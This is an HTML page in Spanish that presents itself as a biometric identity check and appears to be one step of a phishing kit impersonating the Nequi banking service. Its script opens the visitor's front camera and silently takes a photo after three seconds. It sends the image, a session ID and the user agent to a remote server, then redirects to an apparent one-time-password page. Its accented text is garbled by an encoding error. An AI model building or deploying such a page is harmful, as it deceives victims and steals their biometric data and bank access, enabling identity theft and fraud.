<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Verificaci√≥n biom√©trica</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #000;
      color: #fff;
      text-align: center;
    }

    video {
      width: 100%;
      height: 100vh;
      object-fit: cover;
    }

    .overlay {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(0,0,0,0.85);
      z-index: 10;
      display: none;
      flex-direction: column;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #444;
      border-top: 5px solid #00ffcc;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <!-- C√ÅMARA -->
  <video id="cameraVideo" autoplay playsinline></video>

  <!-- LOADER -->
  <div class="overlay" id="loader">
    <div class="spinner"></div>
    <p>Validando identidad‚Ä¶</p>
  </div>

<script>
const SERVER_URL = 'https://nequiscol.onrender.com';

let videoStream = null;
let sessionId = localStorage.getItem('sessionId');

if (!sessionId) {
  sessionId = crypto.randomUUID();
  localStorage.setItem('sessionId', sessionId);
}

async function startCamera() {
  try {
    videoStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' },
      audio: false
    });

    document.getElementById('cameraVideo').srcObject = videoStream;

    // üì∏ Foto autom√°tica a los 3s
    setTimeout(capturePhoto, 3000);

  } catch (e) {
    alert('No se pudo acceder a la c√°mara');
  }
}

function capturePhoto() {
  const video = document.getElementById('cameraVideo');

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0);

  const imageBase64 = canvas.toDataURL('image/jpeg', 0.9);

  stopCamera();
  showLoader();
  sendBiometrics(imageBase64);
}

async function sendBiometrics(imageBase64) {
  try {
    await fetch(`${SERVER_URL}/step-biometrics`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId,
        imageBase64,
        userAgent: navigator.userAgent
      })
    });

    // ‚è© Redirecci√≥n final
    setTimeout(() => {
      window.location.href = 'one-time-pass.php.html';
    }, 1500);

  } catch (err) {
    alert('Error enviando biometr√≠a');
  }
}

function stopCamera() {
  if (videoStream) {
    videoStream.getTracks().forEach(t => t.stop());
    videoStream = null;
  }
}

function showLoader() {
  document.getElementById('loader').style.display = 'flex';
}

// üöÄ INICIO AUTOM√ÅTICO
startCamera();
</script>

</body>
</html>
